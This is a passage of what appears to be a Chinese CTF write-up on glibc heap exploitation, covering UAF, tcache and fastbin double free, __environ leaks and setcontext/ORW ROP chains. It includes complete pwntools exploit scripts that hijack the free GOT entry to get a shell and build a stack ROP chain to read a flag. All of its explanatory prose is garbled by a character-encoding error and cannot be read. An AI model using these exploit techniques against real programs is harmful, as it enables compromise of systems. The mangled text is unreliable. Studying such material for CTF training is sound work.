function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;index: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;index: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index:<span class="built_in">int</span>, length:<span class="built_in">int</span>, descryption</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;index: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;text length: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(length).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;text: &quot;</span>)</span><br><span class="line">    p.sendline(descryption)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    new(<span class="number">0x80</span>, <span class="string">&quot;arttnba3&quot;</span>, <span class="number">0x10</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 0</span></span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">&quot;arttnba3&quot;</span>, <span class="number">0x10</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 1</span></span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">&quot;arttnba3&quot;</span>, <span class="number">0x10</span>, <span class="string">&quot;/bin/sh\x00&quot;</span>) <span class="comment"># idx 2</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    big_size = <span class="number">0x80</span> + <span class="number">8</span> + <span class="number">0x80</span></span><br><span class="line">    padding_length = <span class="number">0x80</span> + <span class="number">8</span> + <span class="number">0x80</span> + <span class="number">8</span> + <span class="number">0x10</span> + <span class="number">8</span></span><br><span class="line">    new(big_size, <span class="string">&quot;arttnba3&quot;</span>, padding_length + <span class="number">4</span>, <span class="string">b&#x27;A&#x27;</span> * padding_length + p32(e.got[<span class="string">&#x27;free&#x27;</span>])) <span class="comment"># idx 3</span></span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">b&quot;description: &quot;</span>)</span><br><span class="line">    free_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">    libc_base = free_addr - libc.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">1</span>, <span class="number">0x10</span>, p32(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure><p>è¿è¡Œå³å¯get shell</p><p><img src="https://i.loli.net/2020/12/04/V4Io3j6Zyqaipx5.png" alt="image.png"></p><h3 id="å…­ã€ROP"><a href="#å…­ã€ROP" class="headerlink" title="å…­ã€ROP"></a>å…­ã€ROP</h3><p>åœ¨å †é¢˜çš„ä¸–ç•Œå¹¶éåªèƒ½å¤Ÿé€šè¿‡åŠ«æŒå„ç§hookæ¥è¾¾åˆ°æ§åˆ¶ç¨‹åºæ‰§è¡Œæµçš„æ•ˆæœï¼Œä¼ ç»Ÿçš„åœ¨æ ˆä¸Šæ„é€ ROPé“¾çš„æ–¹å¼ä»æ—§æœªè¿‡æ—¶ï¼Œåˆ©ç”¨å„ç§pwnæŠ€å·§æˆ‘ä»¬ä»æ—§å¯ä»¥é€šè¿‡åœ¨æ ˆä¸Šæ„é€ ROPé“¾çš„æ–¹å¼æ§åˆ¶ç¨‹åºæ‰§è¡Œæµ</p><h4 id="environ"><a href="#environ" class="headerlink" title="__environ"></a>__environ</h4><p>__environæ˜¯ä¸€ä¸ªä¿å­˜äº†æ ˆä¸Šå˜é‡åœ°å€çš„ç³»ç»Ÿå˜é‡ï¼Œä½äºlibcä¸­ï¼Œåˆ©ç”¨gdbè°ƒè¯•æˆ‘ä»¬å¯ä»¥å¾ˆæ–¹ä¾¿åœ°å¾—çŸ¥å…¶ä¸æ ˆä¸Šåœ°å€é—´çš„åç§»ï¼Œä»¥æ­¤åœ¨æ ˆä¸Šæ„é€ ROPé“¾åŠ«æŒç¨‹åºæ‰§è¡Œæµ</p><h5 id="ä¾‹é¢˜ï¼šminiLCTF2020-heap-master-tcache-double-free-use-after-free-orw"><a href="#ä¾‹é¢˜ï¼šminiLCTF2020-heap-master-tcache-double-free-use-after-free-orw" class="headerlink" title="ä¾‹é¢˜ï¼šminiLCTF2020 - heap_master - tcache double free(use after free) + orw"></a>ä¾‹é¢˜ï¼šminiLCTF2020 - heap_master - tcache double free(use after free) + orw</h5><p> <a href="/download/minil/pwn/pwn%22%E7%82%B9%E5%87%BB%E6%AD%A4%E5%A4%84%E4%B8%8B%E8%BD%BD%E5%8E%9F%E9%A2%98%22">ç‚¹å‡»ä¸‹è½½-pwn</a> </p><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°é™¤äº†åœ°å€éšæœºåŒ–ä»¥å¤–éƒ½å¼€ä¸Šäº†</p><p><img src="https://i.loli.net/2020/11/15/biBCsTKHSuj4l9f.png" alt="image.png"></p><p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p><p><img src="https://i.loli.net/2020/11/15/sFaTZAYb5oqDU3I.png" alt="image.png"></p><p>ç¨‹åºæœ¬èº«æœ‰ç€åˆ†é…å †å—ã€é‡Šæ”¾å †å—ã€è¾“å‡ºå †å—å†…å®¹çš„åŠŸèƒ½</p><p>æˆ‘ä»¬å‘ç°åœ¨<code>delete()</code>å‡½æ•°ä¸­<code>free()</code>å<strong>å¹¶æ²¡æœ‰å°†ç›¸åº”å †å—æŒ‡é’ˆç½®0ï¼Œå­˜åœ¨UAF</strong></p><p><img src="https://i.loli.net/2020/11/15/Ua3OnZdlLFswe48.png" alt="image.png"></p><p>é¢˜ç›®æç¤ºlibcå¯èƒ½æ˜¯2.23ä¹Ÿå¯èƒ½æ˜¯2.27ï¼Œå°è¯•<strong>ç›´æ¥è¿›è¡Œdouble freeï¼Œå‘ç°ç¨‹åºæ²¡æœ‰å´©æºƒ</strong>ï¼Œæ•…å¯çŸ¥æ˜¯æ²¡æœ‰double freeæ£€æŸ¥çš„2.27çš„tcache</p><blockquote><p>libc2.29åtcacheåŠ å…¥double freeæ£€æŸ¥</p></blockquote><p><img src="https://i.loli.net/2020/11/15/yF7H8SBxf9mJcAb.png" alt="image.png"></p><p>åœ¨<code>main()</code>å‡½æ•°å¼€å¤´çš„<code>init()</code>å‡½æ•°ä¸­è°ƒç”¨äº†<code>prctl()</code>å‡½æ•°ï¼Œé™åˆ¶äº†æˆ‘ä»¬ä¸èƒ½å¤Ÿgetshell<img src="https://i.loli.net/2020/11/19/q3Jaw8BfEYjGUNd.png" alt="image.png"></p><p>é¦–å…ˆæˆ‘ä»¬æƒ³åˆ°ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆå¡«æ»¡tcacheï¼Œä¹‹ååˆ†é…ä¸€ä¸ªunsorted binèŒƒå›´çš„chunkï¼Œé€šè¿‡æ‰“å°è¯¥chunkçš„å†…å®¹è·å–<strong>main_arena + 0x60</strong>çš„åœ°å€ï¼Œ<strong>è¿›è€Œè·å¾—libcçš„åœ°å€</strong></p><blockquote><p>libc2.27ä¹‹å‰unsorted biné‡Œçš„chunkçš„fd&#x2F;bkä¼¼ä¹æ˜¯æŒ‡å‘main_arena+0x58çš„ï¼Œç°åœ¨å˜æˆmain_arena+0x60äº†ï¼Œç­‰æœ‰æ—¶é—´å¾—å»çœ‹çœ‹libc2.27çš„æºç äº†â€¦</p></blockquote><p>è™½ç„¶æˆ‘ä»¬ä¸èƒ½å¤Ÿgetshellï¼Œä½†æ˜¯ä¾ç„¶å¯ä»¥é€šè¿‡double freeè¿›è¡Œä»»æ„åœ°å€å†™ï¼Œ<del>æ¯•ç«ŸCTFé¢˜ç›®çš„è¦æ±‚æ˜¯å¾—åˆ°flagï¼Œä¸ä¸€å®šè¦å¾—åˆ°shellï¼Œ</del>æ•…è€ƒè™‘<strong>é€šè¿‡environå˜é‡æ³„æ¼å‡ºæ ˆåœ°å€ååœ¨æ ˆä¸Šæ„é€ ropé“¾è¿›è¡Œorwè¯»å‡ºflag</strong></p><blockquote><p>tips: __environæ˜¯ä¸€ä¸ªä¿å­˜äº†æ ˆä¸Šå˜é‡åœ°å€çš„ç³»ç»Ÿå˜é‡</p></blockquote><p>é€šè¿‡åŠ¨æ€è°ƒè¯•æˆ‘ä»¬å®¹æ˜“å¾—åˆ°<code>___environ</code>ä¸<code>new()</code>ä¸­çš„è¿”å›åœ°å€é—´è·ç¦»ä¸º0x220ï¼Œ<strong>å°†ropé“¾å†™åˆ°è¿™ä¸ªè¿”å›åœ°å€ä¸Šå³å¯æ¥æ”¶åˆ°flag</strong></p><p><img src="https://i.loli.net/2020/11/20/auVAHxCbtO6IUjm.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/11/20/ULcoXK4GiISg6Vb.png" alt="image.png"></p><p>æ„é€ payloadå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>) <span class="comment"># p = remote(&#x27;pwn.challenge.lctf.online&#x27;,10042)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">note_addr = <span class="number">0x6020c0</span></span><br><span class="line">flag_addr = e.bss() + <span class="number">0x500</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;size?&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;content?&#x27;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;index ?&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;index ?&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;what is your name? &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    new(<span class="number">0x80</span>, <span class="string">&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 0</span></span><br><span class="line">    new(<span class="number">0x80</span>, <span class="string">&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 1</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 2</span></span><br><span class="line">    new(<span class="number">0xb0</span>, <span class="string">&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 3</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># fill the tcache</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># unsorted bin leak libc addr</span></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    dump(<span class="number">1</span>)</span><br><span class="line">    main_arena = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x60</span></span><br><span class="line">    malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">    libc_base = malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] <span class="comment"># 0x3cbc30</span></span><br><span class="line">    environ = libc_base + libc.sym[<span class="string">&#x27;__environ&#x27;</span>] <span class="comment"># 0x3ee098</span></span><br><span class="line">    pop_rdi_ret = libc_base + libc.search(asm(<span class="string">&#x27;pop rdi\nret&#x27;</span>)).__next__()</span><br><span class="line">    pop_rsi_ret = libc_base + libc.search(asm(<span class="string">&#x27;pop rsi\nret&#x27;</span>)).__next__()</span><br><span class="line">    pop_rdx_ret = libc_base + libc.search(asm(<span class="string">&#x27;pop rdx\nret&#x27;</span>)).__next__()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># double free in tcache 2</span></span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># overwrite node[0]</span></span><br><span class="line">    new(<span class="number">0x60</span>, p64(note_addr)) <span class="comment"># idx 4, former 2</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 5, former 2</span></span><br><span class="line">    new(<span class="number">0x60</span>, p64(environ))<span class="comment"># idx 6, locate at the note[0] and overwrite it</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak stack addr</span></span><br><span class="line">    dump(<span class="number">0</span>)</span><br><span class="line">    stack_leak = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    ret = stack_leak - <span class="number">0x220</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># rop chain</span></span><br><span class="line">    payload = p64(pop_rdi_ret) + p64(<span class="number">0</span>) + p64(pop_rsi_ret) + p64(flag_addr) + p64(pop_rdx_ret) + p64(<span class="number">4</span>) + p64(e.plt[<span class="string">&#x27;read&#x27;</span>]) <span class="comment"># read str &#x27;flag&#x27; from input</span></span><br><span class="line">    payload += p64(pop_rdi_ret) + p64(flag_addr) + p64(pop_rsi_ret) + p64(<span class="number">4</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;open&#x27;</span>])<span class="comment"># open file &#x27;flag&#x27;</span></span><br><span class="line">    payload += p64(pop_rdi_ret) + p64(<span class="number">3</span>) + p64(pop_rsi_ret) + p64(flag_addr) + p64(pop_rdx_ret) + p64(<span class="number">0x30</span>) + p64(e.plt[<span class="string">&#x27;read&#x27;</span>])<span class="comment"># read flag from file ptr 3(opened by open())</span></span><br><span class="line">    payload += p64(pop_rdi_ret) + p64(flag_addr) + p64(e.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># double free write rop chain on stack</span></span><br><span class="line">    delete(<span class="number">3</span>)</span><br><span class="line">    delete(<span class="number">3</span>)</span><br><span class="line">    new(<span class="number">0xb0</span>, p64(ret))<span class="comment"># idx 7, former 3</span></span><br><span class="line">    new(<span class="number">0xb0</span>, <span class="string">&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 8, former 3</span></span><br><span class="line">    new(<span class="number">0xb0</span>, payload) <span class="comment"># idx 9, locate on the stack</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># get the flag</span></span><br><span class="line">    p.send(<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure><p>è¿è¡Œè„šæœ¬å³å¾—flag</p><p><img src="https://i.loli.net/2020/11/20/FcWrg87oXnbLCMz.png" alt="image.png"></p><h4 id="setcontext"><a href="#setcontext" class="headerlink" title="setcontext"></a>setcontext</h4><p>setcontextå‡½æ•°æ˜¯libcä¸­ä¸€ä¸ªç‹¬ç‰¹çš„å‡½æ•°ï¼Œå…¶ä¸­å­˜åœ¨ç€ä¸€ä¸ªå¯ä»¥è®©æˆ‘ä»¬æ§åˆ¶å„å¯„å­˜å™¨çš„gadgetï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼ˆæ¥è‡ª<a href="https://bbs.pediy.com/thread-263640.htm">ScUpax0s -  å­—èŠ‚è·³åŠ¨ByteCTF2020 ä¸¤é“å †é¢˜ </a>ï¼‰</p><p><img src="https://s3.ax1x.com/2020/11/20/DQ7UyV.png" alt="DQ7UyV.png"></p><p>åªè¦æˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶rdxå¯„å­˜å™¨æŒ‡å‘çš„ä½ç½®ï¼Œåœ¨ä¸Šé¢æ„é€ ä¸€ä¸ª  <code>ucontext_t</code>ç»“æ„ä½“ ï¼Œæ‰§è¡Œsetcontext + 61ä½ç½®ä¸Šçš„gadgetï¼Œå°±èƒ½æ§åˆ¶è¿›ç¨‹å„å¯„å­˜å™¨çš„å€¼ï¼Œéšåå°±æ˜¯æ ˆè¿ç§» + ROPä¸€å¥—å¸¦èµ°</p><p>é€šå¸¸æƒ…å†µä¸‹é€‰æ‹©åœ¨å †ä¸Šæ„é€  <code>ucontext_t</code>ç»“æ„ä½“ï¼ŒåŠ«æŒ__free_hookä¸ºä»¥ä¸‹gadgetï¼ˆä½äºlibcä¸­ï¼‰ï¼š</p><p><img src="https://i.loli.net/2021/02/10/fFBGcstHr6X9JuN.png" alt="image.png"></p><h5 id="ä¾‹é¢˜ï¼šbytectf2020-gun-Use-After-Free-fastbin-double-free-ORW"><a href="#ä¾‹é¢˜ï¼šbytectf2020-gun-Use-After-Free-fastbin-double-free-ORW" class="headerlink" title="ä¾‹é¢˜ï¼šbytectf2020 - gun - Use After Free + fastbin double free + ORW"></a>ä¾‹é¢˜ï¼šbytectf2020 - gun - Use After Free + fastbin double free + ORW</h5><blockquote><p><del>è¿™é“é¢˜æˆ‘çš„IDAé€†å‡ºæ¥æ˜¯ä¸€å †çš„shitâ€¦ä½†æ˜¯çœ‹åˆ«äººçš„wpé‡ŒIDAé€†å‡ºæ¥çš„ä¸œè¥¿æ€ä¹ˆéƒ½è¿™ä¹ˆæ­£å¸¸â€¦Orz</del></p><p>æ¢äº†IDA7.5ï¼Œè‡³å°‘èƒ½çœ‹æ‡‚ç¨‹åºé€»è¾‘äº†XD</p></blockquote><p><a href="/download/bytectf2020/pwn/gun/gun" title="ç‚¹å‡»æ­¤å¤„ä¸‹è½½åŸé¢˜">ç‚¹å‡»ä¸‹è½½-gun</a></p><p><a href="/download/bytectf2020/pwn/gun/libc-2.31.so" title="ç‚¹å‡»æ­¤å¤„ä¸‹è½½åŸé¢˜">ç‚¹å‡»ä¸‹è½½-libc-2.31.so</a></p><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œä¿æŠ¤å…¨å¼€ï¼ˆ<del>å¤§æ¯”èµ›çš„å †é¢˜å¥½åƒéƒ½æ˜¯ä¿æŠ¤å…¨å¼€ï¼Œå·²ç»æ²¡æœ‰checksecçš„å¿…è¦äº†</del>ï¼‰</p><p><img src="https://i.loli.net/2020/12/08/Kaw5yg3udnEVMBp.png" alt="image.png"></p><p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ<del>ï¼ŒIDAåˆ†æå‡ºä¸€å¨shit</del></p><p>ç¬¦å·è¡¨æ‰£å…‰ï¼Œå•¥éƒ½çœ‹ä¸å‡ºï¼ˆæ‚²ï¼‰</p><p><img src="https://i.loli.net/2020/12/08/H5EqnWwVeCjIKh6.png" alt="image.png"></p><p>seccompé™åˆ¶äº†ä¸€å †ä¸œè¥¿ï¼Œç¢ç£¨ç€åº”è¯¥æ˜¯æ‹¿ä¸åˆ°shelläº†ï¼Œåº”è¯¥è¿˜æ˜¯åªèƒ½èµ°orwæ‹¿å¼—è±æ ¼</p><p><img src="https://i.loli.net/2020/12/08/EmitBpFlnNKP7X9.png" alt="image.png"></p><p>ç¨‹åºæ¨¡æ‹Ÿäº†ä¸€æŠŠæªï¼Œèƒ½å¤Ÿå°„å‡ºã€è£…è½½ã€è´­ä¹°å­å¼¹ï¼Œå…¶ä¸­å­å¼¹å¯¹åº”çš„å°±æ˜¯chunkï¼Œè´­ä¹°å­å¼¹å¯¹åº”malloc</p><p><img src="https://i.loli.net/2021/02/05/wxq2SRUBbMs5mcl.png" alt="image.png"></p><p>æœ€å¤šèƒ½å¤Ÿåˆ†é…14ä¸ªå †å—ï¼Œç©ºé—´å……è¶³ï¼ˆx</p><p><img src="https://i.loli.net/2021/02/05/94rFSObq7T3h6zI.png" alt="image.png"></p><p>åœ¨<code>buy()</code>å‡½æ•°ä¸­é™åˆ¶äº†chunkçš„sizeä¸º0x10~0x500ï¼ˆä¼¼ä¹æ²¡ä»€ä¹ˆç”¨ï¼‰</p><p><img src="https://i.loli.net/2021/02/06/eqmvJSHc7I3YDin.png" alt="image.png"></p><p>å…¶ä¸­<code>qword_4070</code>å­˜æ”¾çš„æ˜¯å­å¼¹æ§½å¯¹åº”æ ‡å¿—ä½ï¼Œ0ä¸ºè¯¥æ§½å­å¼¹å·²è¢«å°„å‡ºï¼ˆfreeï¼‰ï¼Œ1ä¸ºè¯¥æ§½å·²è¢«ä½¿ç”¨ï¼ˆå­˜æ”¾æœ‰chunkæŒ‡é’ˆï¼‰ï¼Œ2ä¸ºè¯¥æ§½å­å¼¹å·²è¢«è£…è½½ï¼ˆé“¾å…¥â€å¼¹åŒ£â€œå•å‘é“¾è¡¨ä¸­ï¼‰</p><p>ç»¼åˆèµ·æ¥æˆ‘ä»¬ä¸éš¾çœ‹å‡ºå…¶ä½¿ç”¨ä¸€ä¸ªç»“æ„ä½“æ¥è¡¨ç¤ºä¸€ä¸ªâ€œå­å¼¹â€</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> __<span class="title">INTERNAL_BULLET_</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">char</span> * name;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> flag;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> __<span class="title">INTERNAL_BULLET_</span> * <span class="title">next_bullet</span>;</span></span><br><span class="line">&#125;bullet;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­<code>æˆå‘˜name</code>å‚¨å­˜çš„ä¾¿æ˜¯chunkæŒ‡é’ˆ</p><p>åœ¨<code>load()</code>å‡½æ•°ä¸­ä¼šä½¿ç”¨å¤´æ’æ³•æ„å»ºâ€å¼¹åŒ£â€œï¼ˆå•å‘é“¾è¡¨ï¼‰ï¼Œå…¶ä¸­ä¼šä½¿ç”¨chunkçš„bkæŒ‡é’ˆå­˜å‚¨åŸé“¾è¡¨ä¸­å¤´ç»“ç‚¹</p><p><img src="https://i.loli.net/2021/02/05/MbjAFZzscO56dhE.png" alt="image.png"></p><p>åœ¨<code>shoot()</code>å‡½æ•°ä¸­ä¼šä¾æ¬¡å°†â€å¼¹åŒ£â€œé“¾è¡¨ä¸Šçš„â€å­å¼¹â€é‡Šæ”¾ï¼Œéšåä¼šå°†è¯¥å­å¼¹çš„flagç½®0ï¼Œ<strong>ä½†æ˜¯æ²¡æœ‰æ¸…ç©ºå…¶next_chunkæŒ‡é’ˆï¼Œå­˜åœ¨Use After Freeæ¼æ´ï¼Œå¯¹äºå­å¼¹é“¾è¡¨çš„ä¸ä¸¥æ ¼æ£€æµ‹å¯ä»¥å¯¼è‡´double free</strong></p><p>åŒæ—¶shootå‡½æ•°è¿˜æ•´åˆäº†æ‰“å°å †å—å†…å®¹çš„åŠŸèƒ½ï¼Œåˆ©ç”¨è¿™ä¸ªåŠŸèƒ½æˆ‘ä»¬å¯ä»¥é€šè¿‡å†åˆ†é…åäºŒæ¬¡é‡Šæ”¾çš„æ–¹å¼é€šè¿‡chunkä¸Šæ®‹ç•™æŒ‡é’ˆæ³„éœ²æ ˆåŸºå€ä¸å †åŸºå€</p><p><img src="https://i.loli.net/2021/02/06/7FxncCbzOGshmBe.png" alt="image.png"></p><p>ç”±äºé¢˜ç›®æ‰€ç»™çš„libcç‰ˆæœ¬ä¸º2.31ï¼Œæ·»åŠ äº†å¯¹tcache keyçš„æ£€æµ‹ï¼Œæ— æ³•ç›´æ¥åœ¨tcacheå†…è¿›è¡Œdouble freeï¼Œæ•…è€ƒè™‘<strong>å…ˆå¡«æ»¡tcacheååœ¨fastbinå†…double freeï¼Œåé€šè¿‡stashæœºåˆ¶æ¸…ç©ºtcacheä½¿å¾—fastbinå†…å½¢å¦‚A-&gt;B-&gt;Açš„chunkå€’å…¥tcacheä¸­ï¼Œå®ç°ä»»æ„åœ°å€å†™</strong>ï¼Œè¿™ç§åšæ³•<strong>ä¸éœ€è¦é€šè¿‡fastbinçš„sizeæ£€æŸ¥</strong></p><p>åŒæ—¶ç”±äºç¨‹åºæœ¬èº«é™åˆ¶äº†ç³»ç»Ÿè°ƒç”¨ï¼Œæˆ‘ä»¬åªèƒ½é€šè¿‡orwè¯»å–flag</p><p>è€ƒè™‘é€šè¿‡<code>setcontext()</code>ä¸­çš„gadgetè¿›è¡Œæ§åˆ¶å¯„å­˜å™¨ï¼ŒåŒæ—¶æˆ‘ä»¬è¿˜éœ€è¦æ§åˆ¶rdxå¯„å­˜å™¨ï¼Œè€ƒè™‘åŠ«æŒ__free_hookåé€šè¿‡libcä¸­å¦‚ä¸‹gadgetæ§åˆ¶rdxåè·³è½¬è‡³setcontextå‡½æ•°å†…éƒ¨ï¼š</p><p><img src="https://i.loli.net/2021/02/10/fFBGcstHr6X9JuN.png" alt="image.png"></p><p>æœ€åé€šè¿‡setcontextæ„å»ºçš„ropé“¾orwå³å¯ï¼Œä½¿ç”¨pwntoolsä¸­çš„<code>SigreturnFrame()</code>å¯ä»¥å¿«é€Ÿæ„é€  <code>ucontext_t</code>ç»“æ„ä½“ </p><p>æ„é€ expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 